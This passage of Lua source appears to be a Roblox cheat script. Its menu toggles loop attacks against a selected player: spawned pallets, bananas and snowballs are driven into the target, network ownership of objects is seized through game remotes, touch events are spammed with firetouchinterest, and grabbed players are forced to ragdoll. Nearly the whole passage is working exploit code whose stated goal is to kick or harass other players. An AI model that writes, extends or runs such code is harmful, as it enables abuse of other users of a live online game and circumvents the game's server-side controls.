								ge.DestroyGrabLine:FireServer(bananaPart)
							end
						end)
					end
				end

				if flag11 then
					loopBanana.lastNetworkUpdate = now2
				end
			end

			v22:CreateDropdown({
				Name = "Method Loop [Object]",
				Items = { "FoodBanana / peel", "PalletLightBrown" },
				Default = "FoodBanana / peel",
				Callback = function(arg)
					str7 = arg
				end,
			})

			v22:CreateToggle({
				Name = "Apply method [Object]",
				Default = false,
				Callback = function(arg)
					if arg then
						if not selected5.kickPlayer then
							Toggle1:Set(false)
							return
						end

						if str7 == "FoodBanana / peel" then
							loopBanana.enabled = true
							loopBanana.hasItem = false
							loopBanana.currentBanana = nil
							loopBanana.bananaParts = {}
							loopBanana.lastNetworkUpdate = 0
							loopBanana.lastOwnershipCheck = 0
							loopBanana.isTakingOwnership = false
							loopBanana.originalPos = nil
							loopBanana.waitingForRespawn = false
							loopBanana.ownershipFailCount = 0
							loopBanana.targetAlive = true
							loopBanana.holdPosition = v34(0, -7, 10000)

							if loopBanana.respawnConnection then
								loopBanana.respawnConnection:Disconnect()
								loopBanana.respawnConnection = nil
							end

							local function fn31()
								local v23 = lp4
								local v24 = ws4:FindFirstChild(v23.Name .. "SpawnedInToys")
								if not v24 then
									return nil
								end
								local foodBanana = v24:FindFirstChild("FoodBanana")

								if not foodBanana then
									local canSpawnToy = lp4:FindFirstChild("CanSpawnToy")

									if canSpawnToy and canSpawnToy.Value then
										local character = v23.Character

										if character and character:FindFirstChild("HumanoidRootPart") then
											local humanoidRootPart = character.HumanoidRootPart
											local spawnToyRemoteFunction = repS.MenuToys.SpawnToyRemoteFunction

											task.spawn(function()
												pcall(function()
													spawnToyRemoteFunction:InvokeServer("FoodBanana", humanoidRootPart.CFrame * cf3(0, 1000, 20), v34(0, 0, 0))
												end)
											end)

											for i = 1, 30 do
												foodBanana = v24:FindFirstChild("FoodBanana")
												if not foodBanana then
													task.wait()
													continue
												end
												break
											end
										end
									end
								end

								return foodBanana
							end

							loopBanana.loopThread = task.spawn(function()
								local v23 = lp4

								while loopBanana.enabled do
									if v23.Character and v23.Character:FindFirstChild("Humanoid") and v23.Character.Humanoid.Health > 0 then
										local character = v23.Character

										if character:FindFirstChild("HumanoidRootPart") then
											if not loopBanana.hasItem then
												local v24 = fn31()

												if v24 then
													local holdPart = v24:FindFirstChild("HoldPart")
													local holdItemRemoteFunction = holdPart and holdPart:FindFirstChild("HoldItemRemoteFunction")
													holdPart = holdPart and holdPart:FindFirstChild("DropItemRemoteFunction")

													if holdItemRemoteFunction and holdPart then
														task.spawn(function()
															pcall(function()
																loopBanana.hasItem = holdItemRemoteFunction:InvokeServer(v24, character)

																if loopBanana.hasItem then
																	task.wait(0.1)
																	fn15(v24)
																	local now2 = tick()

																	while fn19(v24) and loopBanana.enabled and tick() - now2 < 3 do
																		task.wait(0.1)
																	end

																	pcall(function()
																		local random = math.random
																		holdPart:InvokeServer(v24, character, v34(math.random(100, 999), math.random(100, 999), random(100, 999)))
																	end)

																	loopBanana.hasItem = false
																	task.wait(0.1)

																	if v24 and v24.Parent then
																		loopBanana.currentBanana = v24
																		fn21(v24)
																		loopBanana.lastOwnershipCheck = tick()
																		loopBanana.ownershipFailCount = 0
																	end
																end
															end)
														end)
													end
												end
											end

											if loopBanana.currentBanana and loopBanana.currentBanana.Parent and #loopBanana.bananaParts > 0 and not loopBanana.isTakingOwnership then
												fn30()
											end
										end
									end

									task.wait()
								end

								fn16()
								loopBanana.currentBanana = nil
								loopBanana.bananaParts = {}
							end)
						elseif str7 == "PalletLightBrown" then
							loopPallet.enabled = true
							loopPallet.currentPallet = nil

							local function fn31(arg2)
								if not arg2 then
									return
								end

								pcall(function()
									local destroyRemote2 = destroyRemote or _G.DestroyRemote

									if destroyRemote2 then
										destroyRemote2:FireServer(arg2)
									end
								end)
							end

							local function fn32(arg2)
								if not arg2 then
									return
								end

								for _, descendant in ipairs(arg2:GetDescendants()) do
									if descendant:IsA("BasePart") then
										descendant.Transparency = 1
										descendant.CanCollide = false
										descendant.CanQuery = false
									end
								end
							end

							local function fn33(arg2)
								if not arg2 or not arg2.Parent then
									return false
								end
								local soundPart = arg2:FindFirstChild("SoundPart")
								if not soundPart then
									return false
								end
								local partOwner = soundPart:FindFirstChild("PartOwner")

								if partOwner then
									if partOwner.Value == lp4.Name then
										return true
									end

									if partOwner.Value ~= "" then
										fn31(arg2)
										return false
									end
								end

								return false
							end

							local function fn34(arg2)
								if not arg2 or not arg2.Parent then
									return false
								end
								local soundPart = arg2:FindFirstChild("SoundPart")
								if not soundPart then
									return false
								end
								local sno3 = sno2 or _G.SNO
								local n26 = 0

								while n26 < 15 and loopPallet.enabled do
									pcall(function()
										if sno3 then
											sno3:FireServer(soundPart, soundPart.CFrame)
										end
									end)

									task.wait(0.15)
									n26 += 1
									local partOwner = soundPart:FindFirstChild("PartOwner")

									if partOwner then
										if partOwner.Value == lp4.Name then
											fn32(arg2)
											return true
										end

										if partOwner.Value ~= "" then
											fn31(arg2)
											return false
										end
									end
								end

								return false
							end

							local function fn35()
								local v23 = ws4:FindFirstChild(lp4.Name .. "SpawnedInToys")

								if v23 then
									for _, child in ipairs(v23:GetChildren()) do
										if child.Name == "PalletLightBrown" then
											return child
										end
									end
								end

								return nil
							end

							local function fn36()
								local canSpawnToy = lp4:FindFirstChild("CanSpawnToy")
								if not canSpawnToy or not canSpawnToy.Value then
									return nil
								end
								local character = lp4.Character
								character = character and character:FindFirstChild("Head")
								if not character then
									return nil
								end
								local n26 = character.CFrame * cf3(0, 15, 20)
								local spawnRemote = _G.SpawnRemote

								if not spawnRemote then
									spawnRemote = repS:FindFirstChild("MenuToys") and repS.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
								end

								local response = nil

								if spawnRemote then
									pcall(function()
										response = spawnRemote:InvokeServer("PalletLightBrown", n26, v34(0, -90, 0))
									end)
								end

								if not response then
									task.wait(0.25)
									response = fn35()
								end

								if response then
									fn32(response)
								end

								return response
							end

							loopPallet.thread = task.spawn(function()
								while loopPallet.enabled do
									local kickPlayer2 = selected5 and selected5.kickPlayer
									local flag11 = not kickPlayer2 or not kickPlayer2.Parent or not kickPlayer2.Character

									if flag11 then
										if loopPallet.currentPallet then
											fn31(loopPallet.currentPallet)
											loopPallet.currentPallet = nil
										end

										task.wait(0.25)
										continue
									else
										local character = kickPlayer2.Character
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
										local humanoid = character:FindFirstChild("Humanoid")
										local flag12 = not humanoidRootPart or not humanoid
										local flag13 = flag12 or humanoid.Health <= 0

										if flag13 then
											if loopPallet.currentPallet then
												fn31(loopPallet.currentPallet)
												loopPallet.currentPallet = nil
											end

											task.wait(0.25)
											continue
										else
											local currentPallet = loopPallet.currentPallet
											local flag14 = not currentPallet
											local flag15 = flag14 or not currentPallet.Parent
											local parent, soundPart, v23

											if flag15 then
												currentPallet = fn35() or fn36()

												if currentPallet then
													if fn34(currentPallet) then
														loopPallet.currentPallet = currentPallet
														local exitTo2 = nil

														while true do
															parent = currentPallet and currentPallet.Parent

															if parent then
																fn32(currentPallet)
																soundPart = currentPallet:FindFirstChild("SoundPart")

																if soundPart then
																	fn14()
																	v23 = fn29(character, n25)

																	if v23 then
																		pcall(function()
																			soundPart.CFrame = CFrame.new(v23)
																			soundPart.AssemblyLinearVelocity = v34(0, 0, 0)
																			local random = math.random
																			soundPart.AssemblyAngularVelocity = Vector3.new(math.random(-50000, 50000), math.random(-50000, 50000), random(-50000, 50000))
																		end)
																	end
																end
															end

															task.wait()
															local exitTo = nil

															while loopPallet.enabled do
																kickPlayer2 = selected5 and selected5.kickPlayer
																flag11 = not kickPlayer2 or not kickPlayer2.Parent or not kickPlayer2.Character

																if flag11 then
																	if loopPallet.currentPallet then
																		fn31(loopPallet.currentPallet)
																		loopPallet.currentPallet = nil
																	end

																	task.wait(0.25)
																else
																	character = kickPlayer2.Character
																	humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
																	humanoid = character:FindFirstChild("Humanoid")
																	flag12 = not humanoidRootPart or not humanoid
																	flag13 = flag12 or humanoid.Health <= 0

																	if flag13 then
																		if loopPallet.currentPallet then
																			fn31(loopPallet.currentPallet)
																			loopPallet.currentPallet = nil
																		end

																		task.wait(0.25)
																	else
																		currentPallet = loopPallet.currentPallet
																		flag14 = not currentPallet
																		flag15 = flag14 or not currentPallet.Parent

																		if flag15 then
																			currentPallet = fn35() or fn36()

																			if currentPallet then
																				if fn34(currentPallet) then
																					exitTo = 2
																					break
																				else
																					fn31(currentPallet)
																					loopPallet.currentPallet = nil
																					task.wait(0.5)
																				end
																			else
																				task.wait(0.5)
																			end
																		elseif not fn33(currentPallet) then
																			if not fn34(currentPallet) then
																				fn31(currentPallet)
																				loopPallet.currentPallet = nil
																				task.wait(0.5)
																			else
																				exitTo = 1
																				break
																			end
																		else
																			parent = currentPallet and currentPallet.Parent

																			if parent then
																				fn32(currentPallet)
																				soundPart = currentPallet:FindFirstChild("SoundPart")

																				if soundPart then
																					fn14()
																					v23 = fn29(character, n25)

																					if v23 then
																						pcall(function()
																							soundPart.CFrame = CFrame.new(v23)
																							soundPart.AssemblyLinearVelocity = v34(0, 0, 0)
																							local random = math.random
																							soundPart.AssemblyAngularVelocity = Vector3.new(math.random(-50000, 50000), math.random(-50000, 50000), random(-50000, 50000))
																						end)
																					end
																				end
																			end

																			task.wait()
																		end
																	end
																end
															end

															if exitTo == 1 then
																exitTo2 = 1
																break
															elseif exitTo == 2 then
																loopPallet.currentPallet = currentPallet
																continue
															end

															break
														end

														if exitTo2 == 1 then
															parent = currentPallet and currentPallet.Parent

															if parent then
																fn32(currentPallet)
																soundPart = currentPallet:FindFirstChild("SoundPart")

																if soundPart then
																	fn14()
																	v23 = fn29(character, n25)

																	if v23 then
																		pcall(function()
																			soundPart.CFrame = CFrame.new(v23)
																			soundPart.AssemblyLinearVelocity = v34(0, 0, 0)
																			local random = math.random
																			soundPart.AssemblyAngularVelocity = Vector3.new(math.random(-50000, 50000), math.random(-50000, 50000), random(-50000, 50000))
																		end)
																	end
																end
															end

															task.wait()
															continue
														end
													else
														fn31(currentPallet)
														loopPallet.currentPallet = nil
														task.wait(0.5)
														continue
													end
												else
													task.wait(0.5)
													continue
												end
											else
												if not fn33(currentPallet) then
													if not fn34(currentPallet) then
														fn31(currentPallet)
														loopPallet.currentPallet = nil
														task.wait(0.5)
													else
														parent = currentPallet and currentPallet.Parent

														if parent then
															fn32(currentPallet)
															soundPart = currentPallet:FindFirstChild("SoundPart")

															if soundPart then
																fn14()
																v23 = fn29(character, n25)

																if v23 then
																	pcall(function()
																		soundPart.CFrame = CFrame.new(v23)
																		soundPart.AssemblyLinearVelocity = v34(0, 0, 0)
																		local random = math.random
																		soundPart.AssemblyAngularVelocity = Vector3.new(math.random(-50000, 50000), math.random(-50000, 50000), random(-50000, 50000))
																	end)
																end
															end
														end

														task.wait()
													end
												else
													parent = currentPallet and currentPallet.Parent

													if parent then
														fn32(currentPallet)
														soundPart = currentPallet:FindFirstChild("SoundPart")

														if soundPart then
															fn14()
															v23 = fn29(character, n25)

															if v23 then
																pcall(function()
																	soundPart.CFrame = CFrame.new(v23)
																	soundPart.AssemblyLinearVelocity = v34(0, 0, 0)
																	local random = math.random
																	soundPart.AssemblyAngularVelocity = Vector3.new(math.random(-50000, 50000), math.random(-50000, 50000), random(-50000, 50000))
																end)
															end
														end
													end

													task.wait()
												end

												continue
											end
										end
									end

									break
								end

								fn17()
								loopPallet.currentPallet = nil
							end)
						end

						playSound2(sounds2.Notify)
					else
						loopBanana.enabled = false
						loopBanana.hasItem = false
						loopBanana.currentBanana = nil
						loopBanana.bananaParts = {}
						loopBanana.lastNetworkUpdate = 0
						loopBanana.lastOwnershipCheck = 0
						loopBanana.isTakingOwnership = false
						loopBanana.originalPos = nil
						loopBanana.waitingForRespawn = false
						loopBanana.ownershipFailCount = 0
						loopBanana.targetAlive = false

						if loopBanana.respawnConnection then
							loopBanana.respawnConnection:Disconnect()
							loopBanana.respawnConnection = nil
						end

						if loopBanana.loopThread then
							task.cancel(loopBanana.loopThread)
							loopBanana.loopThread = nil
						end

						fn16()
						loopPallet.enabled = false

						if loopPallet.thread then
							task.cancel(loopPallet.thread)
							loopPallet.thread = nil
						end

						fn17()
						loopPallet.currentPallet = nil
					end
				end,
			})
		end

		v22:CreateDropdown({
			Name = "Method Loop [Explosions]",
			Items = { "BallSnowball" },
			Default = "BallSnowball",
			Callback = function(arg)
				selectedExplosion = arg
			end,
		})

		v22:CreateToggle({
			Name = "Apply method [Explosions]",
			Default = false,
			Callback = function5 == nil and function(arg)
				if arg then
					explosionLoopEnabled = true

					explosionLoopThread = task.spawn(function()
						local v23 = lp4
						local menuToys = repS.MenuToys
						local setNetworkOwner = repS.GrabEvents.SetNetworkOwner
						local spawnToyRemoteFunction = menuToys.SpawnToyRemoteFunction
						local destroyToy = menuToys.DestroyToy

						local function fn14()
							local v24 = ws4:FindFirstChild(v23.Name .. "SpawnedInToys")

							if v24 then
								for _, child in pairs(v24:GetChildren()) do
									if child.Name == selectedExplosion then
										pcall(function()
											destroyToy:FireServer(child)
										end)
									end
								end
							end

							if currentBody then
								currentBody = nil
							end

							if currentTarget then
								currentTarget = nil
							end

							if currentBomb then
								currentBomb = nil
							end

							touchSpamActive = false

							if bodyVelocity then
								bodyVelocity:Destroy()
								bodyVelocity = nil
							end

							if bodyForce then
								bodyForce:Destroy()
								bodyForce = nil
							end

							if renderConnection then
								renderConnection:Disconnect()
								renderConnection = nil
							end
						end

						local function fn15(arg2)
							pcall(function()
								local function fn16(arg3)
									if arg3:IsA("BasePart") then
										arg3.Transparency = 1
										arg3.CanCollide = true
									elseif arg3:IsA("Decal") or arg3:IsA("Texture") then
										arg3.Transparency = 1
									elseif arg3:IsA("ParticleEmitter") or arg3:IsA("Trail") or arg3:IsA("Beam") or arg3:IsA("Fire") or arg3:IsA("Smoke") or arg3:IsA("Sparkles") then
										arg3.Enabled = false
									elseif arg3:IsA("Highlight") then
										arg3:Destroy()
									end
								end

								for _, descendant in pairs(arg2:GetDescendants()) do
									fn16(descendant)
								end

								arg2.DescendantAdded:Connect(function(descendant)
									fn16(descendant)
								end)
							end)
						end

						while explosionLoopEnabled do
							local kickPlayer2 = _G.Selected and (type(_G.Selected) == "table" and _G.Selected.kickPlayer or _G.Selected)

							if not kickPlayer2 or not kickPlayer2.Parent then
								task.wait(0.5)
								continue
							else
								local character = kickPlayer2.Character

								if not character or not character.Parent then
									task.wait(0.5)
									continue
								else
									local humanoid = character:FindFirstChild("Humanoid")

									if humanoid and humanoid.Health <= 0 then
										fn14()
										task.wait(0.5)
										continue
									else
										local character2 = v23.Character
										local humanoidRootPart = character2 and character2:FindFirstChild("HumanoidRootPart")
										local v24 = ws4:FindFirstChild(v23.Name .. "SpawnedInToys")

										if not humanoidRootPart or not v24 then
											task.wait(0.5)
											continue
										else
											local canSpawnToy = v23:FindFirstChild("CanSpawnToy")

											while explosionLoopEnabled and canSpawnToy and not canSpawnToy.Value do
												for _, child in pairs(v24:GetChildren()) do
													if child.Name == selectedExplosion then
														pcall(function()
															destroyToy:FireServer(child)
														end)
													end
												end

												task.wait(0.1)
											end

											if explosionLoopEnabled then
												for _, child in pairs(v24:GetChildren()) do
													if child.Name == selectedExplosion then
														pcall(function()
															destroyToy:FireServer(child)
														end)
													end
												end

												local tbl7 = {}

												for _, child in pairs(v24:GetChildren()) do
													if child.Name == selectedExplosion then
														tbl7[child] = true
													end
												end

												local v25 = nil
												local connection3 = nil

												connection3 = v24.ChildAdded:Connect(function(child)
													if child.Name == selectedExplosion and not tbl7[child] then
														fn15(child)
														v25 = child

														if connection3 then
															connection3:Disconnect()
															connection3 = nil
														end
													end
												end)

												task.spawn(function()
													while explosionLoopEnabled and not v25 do
														pcall(function()
															spawnToyRemoteFunction:InvokeServer(selectedExplosion, CFrame.new(humanoidRootPart.Position + Vector3.new(0, 20, 20)), Vector3.zero)
														end)

														task.wait(0.1)
													end
												end)

												while explosionLoopEnabled and not v25 do
													for _, child in pairs(v24:GetChildren()) do
														if child.Name == selectedExplosion and not tbl7[child] then
															fn15(child)
															v25 = child
															break
														end
													end

													task.wait(0.1)
												end

												if connection3 then
													connection3:Disconnect()
													connection3 = nil
												end

												local v26 = v25

												if not v26 or not explosionLoopEnabled then
													task.wait(0.2)
												else
													local body = v26:FindFirstChild("Body") or v26:FindFirstChild("SoundPart") or v26:FindFirstChildWhichIsA("BasePart")

													if not body then
														for _, child in pairs(v26:GetChildren()) do
															if child:IsA("BasePart") then
																body = child
																break
															end
														end
													end

													if not body then
														task.wait(0.2)
													else
														pcall(function()
															body.Massless = false
															body.CanCollide = true
														end)

														while true do
															if explosionLoopEnabled and body.Parent then
																local partOwner = body:FindFirstChild("PartOwner") or v26:FindFirstChild("PartOwner")

																if not (not partOwner or partOwner.Value == v23.Name) then
																	pcall(function()
																		setNetworkOwner:FireServer(body, body.CFrame)
																	end)

																	task.wait()
																	continue
																end
															end

															break
														end

														local head = character:FindFirstChild("Head")

														if not head then
															task.wait()
														else
															currentBody = body
															currentTarget = head
															currentBomb = v26
															touchSpamActive = true

															if bodyVelocity then
																bodyVelocity:Destroy()
																bodyVelocity = nil
															end

															if bodyForce then
																bodyForce:Destroy()
																bodyForce = nil
															end

															local n25 = 3000

															pcall(function()
																bodyVelocity = Instance.new("BodyVelocity")
																bodyVelocity.Parent = body
																bodyVelocity.Velocity = Vector3.new(0, 3000, 0)
																bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
																bodyForce = Instance.new("BodyForce")
																bodyForce.Parent = body
																local gravity = workspace.Gravity
																bodyForce.Force = Vector3.new(0, body:GetMass() * gravity * n25, 0)
															end)

															if renderConnection then
																renderConnection:Disconnect()
																renderConnection = nil
															end

															renderConnection = rs3.RenderStepped:Connect(function()
																if not explosionLoopEnabled or not currentBody or not currentBody.Parent or not currentTarget or not currentTarget.Parent then
																	if renderConnection then
																		renderConnection:Disconnect()
																		renderConnection = nil
																	end

																	touchSpamActive = false
																	return
																end

																local parent = currentTarget.Parent

																if parent and parent:IsA("Model") then
																	local humanoid2 = parent:FindFirstChild("Humanoid")

																	if humanoid2 and humanoid2.Health <= 0 then
																		fn14()

																		if renderConnection then
																			renderConnection:Disconnect()
																			renderConnection = nil
																		end

																		touchSpamActive = false
																		return
																	end
																end

																if bodyVelocity and bodyVelocity.Parent and currentTarget then
																	bodyVelocity.Velocity = (currentTarget.Position - currentBody.Position).Unit * 300 + Vector3.new(0, 50, 0)
																end

																if touchSpamActive and currentTarget and currentTarget.Parent then
																	pcall(function()
																		firetouchinterest(currentTarget, currentBody, 0)
																		firetouchinterest(currentTarget, currentBody, 1)
																	end)
																end
															end)

															while true do
																if explosionLoopEnabled and currentBody and currentBody.Parent and currentTarget and currentTarget.Parent then
																	local humanoid2 = currentTarget.Parent:FindFirstChild("Humanoid")
																	if not (humanoid2 and humanoid2.Health <= 0) then
																		task.wait(0.2)
																		continue
																	end
																end

																break
															end

															fn14()
															task.wait(0.1)
														end
													end
												end

												continue
											end
										end
									end
								end
							end

							break
						end

						pcall(fn14)
					end)

					playSound2(sounds2.Notify)
				else
					explosionLoopEnabled = false
					StopExplosionLoop()
				end
			end,
		})

		do
			local v23 = _G.GrabsTab:CreateBlock({ Name = "Grabs", Side = "Left", ImageID = "17313313998" })
			local states = _G.States or {}
			_G.States = states
			local ws5 = _G.WS
			local uis = _G.UIS

			if not _G.V3 then
			end

			if not _G.CF then
			end

			if not (_G.runService or _G.RS) then
				game:GetService("RunService")
			end

			local tspawn = _G.tspawn or task.spawn
			local tcancel = _G.tcancel or task.cancel

			if not _G.twait then
			end

			local permanentPallet = _G.PermanentPallet or states.PermanentPallet
			local v24 = pcall

			states.GrabModifiers = states.GrabModifiers or {
				superStrength = { enabled = false, obj = nil, strength = 200, connections = {}, thread = nil },
				masslessGrab = { enabled = false, connections = {} },
				spinGrab = { enabled = false, spinSpeed = 50, connections = {}, thread = nil },
				noclipGrab = { enabled = false, connections = {}, activeGrabs = {} },
				infiniteLineDistance = { enabled = false, distance = 0, connections = {}, thread = nil },
			}

			local grabModifiers = states.GrabModifiers
			states.GrabAttacks = states.GrabAttacks or { ragdollGrab = { enabled = false, connections = {}, thread = nil, pallet = nil } }
			local grabAttacks = states.GrabAttacks
			grabModifiers.superStrength.strength = 200

			v23:CreateSlider({
				Name = "Throw Force",
				Min = 50,
				Max = 500,
				Default = 200,
				Callback = function(strength)
					grabModifiers.superStrength.strength = strength
				end,
			})

			v23:CreateToggle({
				Name = "Super Strength",
				Default = false,
				Callback = function(arg)
					if arg then
						grabModifiers.superStrength.enabled = true

						local connection3 = ws5.ChildAdded:Connect(function(child)
							if child.Name == "GrabParts" then
								local grabPart = child:FindFirstChild("GrabPart") or child:WaitForChild("GrabPart", 1)

								if grabPart then
									local weldConstraint = grabPart:FindFirstChild("WeldConstraint") or grabPart:WaitForChild("WeldConstraint", 1)

									if weldConstraint and weldConstraint.Part1 then
										grabModifiers.superStrength.obj = weldConstraint.Part1
									end
								end
							end
						end)

						table.insert(grabModifiers.superStrength.connections, connection3)

						local connection4 = ws5.ChildRemoved:Connect(function(child)
							if child.Name == "GrabParts" then
								task.wait()
								grabModifiers.superStrength.obj = nil
							end
						end)

						table.insert(grabModifiers.superStrength.connections, connection4)

						local connection5 = uis.InputBegan:Connect(function(input)
							if not grabModifiers.superStrength.enabled then
								return
							end

							if input.UserInputType == Enum.UserInputType.MouseButton2 then
								if grabModifiers.superStrength.obj and grabModifiers.superStrength.obj.Parent then
									local currentCamera2 = workspace.CurrentCamera
									local bodyVelocity_ = Instance.new("BodyVelocity")
									bodyVelocity_.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
									bodyVelocity_.Velocity = currentCamera2.CFrame.LookVector * grabModifiers.superStrength.strength
									bodyVelocity_.Parent = grabModifiers.superStrength.obj

									task.delay(2, function()
										if bodyVelocity_ and bodyVelocity_.Parent then
											bodyVelocity_:Destroy()
										end
									end)

									grabModifiers.superStrength.obj = nil
								end
							end
						end)

						table.insert(grabModifiers.superStrength.connections, connection5)
					else
						grabModifiers.superStrength.enabled = false

						for _, connection3 in ipairs(grabModifiers.superStrength.connections) do
							v24(function()
								connection3:Disconnect()
							end)
						end

						grabModifiers.superStrength.connections = {}
						grabModifiers.superStrength.obj = nil
					end
				end,
			})

			v23:CreateToggle({
				Name = "Massless Grab",
				Default = false,
				Callback = function(arg)
					if arg then
						grabModifiers.masslessGrab.enabled = true

						grabModifiers.masslessGrab.connections = {
							(ws5.ChildAdded:Connect(function(child)
								if child.Name == "GrabParts" then
									local dragPart = child:FindFirstChild("DragPart") or child:WaitForChild("DragPart", 1)

									if dragPart then
										local alignPosition = dragPart:FindFirstChild("AlignPosition")
										local alignOrientation = dragPart:FindFirstChild("AlignOrientation")
										alignPosition = alignPosition or dragPart:WaitForChild("AlignPosition", 1)
										alignOrientation = alignOrientation or dragPart:WaitForChild("AlignOrientation", 1)

										if alignPosition and alignOrientation then
											v24(function()
												alignPosition.MaxAxesForce = Vector3.new(math.huge, math.huge, math.huge)
												alignPosition.MaxForce = math.huge
												alignPosition.Responsiveness = 200
												alignOrientation.Responsiveness = 200
												alignOrientation.MaxTorque = math.huge
											end)
										end
									end
								end
							end)),
						}
					else
						grabModifiers.masslessGrab.enabled = false

						for _, connection3 in ipairs(grabModifiers.masslessGrab.connections) do
							v24(function()
								connection3:Disconnect()
							end)
						end

						grabModifiers.masslessGrab.connections = {}
					end
				end,
			})

			v23:CreateToggle({
				Name = "Noclip Grab",
				Default = false,
				Callback = function(arg)
					if arg then
						grabModifiers.noclipGrab.enabled = true

						local function fn14(arg2)
							local tbl7 = {}

							for _, descendant in ipairs(arg2:GetDescendants()) do
								if descendant:IsA("BasePart") then
									tbl7[descendant] = descendant.CanCollide
								end
							end

							return tbl7
						end

						local function fn15(arg2)
							for k, v25 in pairs(arg2) do
								if k and k.Parent then
									v24(function()
										k.CanCollide = v25
									end)
								end
							end
						end

						local function fn16(arg2)
							task.spawn(function()
								local grabPart = arg2:WaitForChild("GrabPart", 1)
								if not grabPart then
									return
								end
								local weldConstraint = grabPart:WaitForChild("WeldConstraint", 1)
								if not weldConstraint or not weldConstraint.Part1 then
									return
								end
								local part1 = weldConstraint.Part1
								if part1.Anchored then
									return
								end
								local parent = part1.Parent
								if not parent or not parent:IsA("Model") then
									return
								end

								if grabModifiers.noclipGrab.activeGrabs[parent] then
									return
								end
								local v25 = fn14(parent)
								grabModifiers.noclipGrab.activeGrabs[parent] = v25

								task.spawn(function()
									while arg2.Parent and grabModifiers.noclipGrab.enabled do
										for k in pairs(v25) do
											if k and k.Parent then
												k.CanCollide = false
											end
										end

										task.wait(0.2)
									end
								end)

								local connection3 = nil

								connection3 = arg2.AncestryChanged:Connect(function()
									if not arg2.Parent then
										fn15(v25)
										grabModifiers.noclipGrab.activeGrabs[parent] = nil

										if connection3 then
											connection3:Disconnect()
										end
									end
								end)

								table.insert(grabModifiers.noclipGrab.connections, connection3)
							end)
						end

						local connection3 = ws5.ChildAdded:Connect(function(child)
							if grabModifiers.noclipGrab.enabled and child.Name == "GrabParts" then
								fn16(child)
							end
						end)

						table.insert(grabModifiers.noclipGrab.connections, connection3)

						for _, child in ipairs(ws5:GetChildren()) do
							if child.Name == "GrabParts" then
								fn16(child)
							end
						end
					else
						grabModifiers.noclipGrab.enabled = false

						for _, activeGrab in pairs(grabModifiers.noclipGrab.activeGrabs) do
							restoreCollisions(activeGrab)
						end

						grabModifiers.noclipGrab.activeGrabs = {}

						for _, connection3 in ipairs(grabModifiers.noclipGrab.connections) do
							v24(function()
								connection3:Disconnect()
							end)
						end

						grabModifiers.noclipGrab.connections = {}
					end
				end,
			})

			v23:CreateToggle({
				Name = "Infinite Line Distance",
				Default = false,
				Callback = function(arg)
					if arg then
						grabModifiers.infiniteLineDistance.enabled = true
						grabModifiers.infiniteLineDistance.distance = 0

						grabModifiers.infiniteLineDistance.thread = tspawn(function()
							while grabModifiers.infiniteLineDistance.enabled and task.wait(0.03) do
								local grabParts = ws5:FindFirstChild("GrabParts")

								if grabParts then
									local dragPart = grabParts:FindFirstChild("DragPart")

									if dragPart then
										local dragAttach = dragPart:FindFirstChild("DragAttach")

										if dragAttach then
											dragAttach.Position = workspace.CurrentCamera.CFrame.LookVector * grabModifiers.infiniteLineDistance.distance
										end
									end
								end
							end
						end)

						local connection3 = uis.InputChanged:Connect(function(input)
							if not grabModifiers.infiniteLineDistance.enabled then
								return
							end

							if input.UserInputType == Enum.UserInputType.MouseWheel then
								if ws5:FindFirstChild("GrabParts") then
									if input.Position.Z == 1 then
										grabModifiers.infiniteLineDistance.distance = grabModifiers.infiniteLineDistance.distance + 3
									else
										grabModifiers.infiniteLineDistance.distance = grabModifiers.infiniteLineDistance.distance - 3
									end
								else
									grabModifiers.infiniteLineDistance.distance = 0
								end
							end
						end)

						table.insert(grabModifiers.infiniteLineDistance.connections, connection3)
					else
						grabModifiers.infiniteLineDistance.enabled = false

						if grabModifiers.infiniteLineDistance.thread then
							tcancel(grabModifiers.infiniteLineDistance.thread)
							grabModifiers.infiniteLineDistance.thread = nil
						end

						grabModifiers.infiniteLineDistance.distance = 0

						for _, connection3 in ipairs(grabModifiers.infiniteLineDistance.connections) do
							v24(function()
								connection3:Disconnect()
							end)
						end

						grabModifiers.infiniteLineDistance.connections = {}
					end
				end,
			})

			v23:CreateToggle({
				Name = "Ragdoll Grab",
				Default = false,
				Callback = function(arg)
					if arg then
						if not permanentPallet or not permanentPallet.enabled or not permanentPallet.currentPallet then
							return
						end
						grabAttacks.ragdollGrab.enabled = true
						grabAttacks.ragdollGrab.pallet = permanentPallet.currentPallet
						local soundPart = grabAttacks.ragdollGrab.pallet:FindFirstChild("SoundPart")
						if not soundPart then
							return
						end
						local v25 = nil

						grabAttacks.ragdollGrab.thread = tspawn(function()
							while grabAttacks.ragdollGrab.enabled do
								local grabParts = ws5:FindFirstChild("GrabParts")

								if grabParts then
									local grabPart = grabParts:FindFirstChild("GrabPart")

									if grabPart then
										local weldConstraint = grabPart:FindFirstChild("WeldConstraint")

										if weldConstraint and weldConstraint.Part1 then
											local part1 = weldConstraint.Part1
											part1 = part1 and part1.Parent

											if part1 and part1:FindFirstChild("HumanoidRootPart") and part1:FindFirstChild("Humanoid") then
												v25 = part1
												local humanoid = part1.Humanoid

												v24(function()
													if humanoid:FindFirstChild("Ragdolled") and humanoid.Ragdolled.Value == false then
														humanoid:ChangeState(Enum.HumanoidStateType.Physics)
													end
												end)
											end
										end
									end
								end

								task.wait()
							end
						end)

						grabAttacks.ragdollGrab.palletThread = tspawn(function()
							while grabAttacks.ragdollGrab.enabled do
								if soundPart and soundPart.Parent and v25 and v25.Parent then
									local head = v25:FindFirstChild("Head")

									if head then
										v24(function()
											soundPart.CFrame = head.CFrame
										end)
									end
								end

								task.wait(0.1)
							end
						end)
					else
						grabAttacks.ragdollGrab.enabled = false

						if grabAttacks.ragdollGrab.thread then
							tcancel(grabAttacks.ragdollGrab.thread)
							grabAttacks.ragdollGrab.thread = nil
						end

						if grabAttacks.ragdollGrab.palletThread then
							tcancel(grabAttacks.ragdollGrab.palletThread)
							grabAttacks.ragdollGrab.palletThread = nil
						end

						if grabAttacks.ragdollGrab.pallet and grabAttacks.ragdollGrab.pallet.Parent then
							local soundPart = grabAttacks.ragdollGrab.pallet:FindFirstChild("SoundPart")

							if soundPart then
								v24(function()
									soundPart.CFrame = CFrame.new(0, 1e9, 0)
								end)
							end
						end

						grabAttacks.ragdollGrab.pallet = nil
						grabAttacks.ragdollGrab.palletThread = nil
					end
				end,
			})
		end
	end

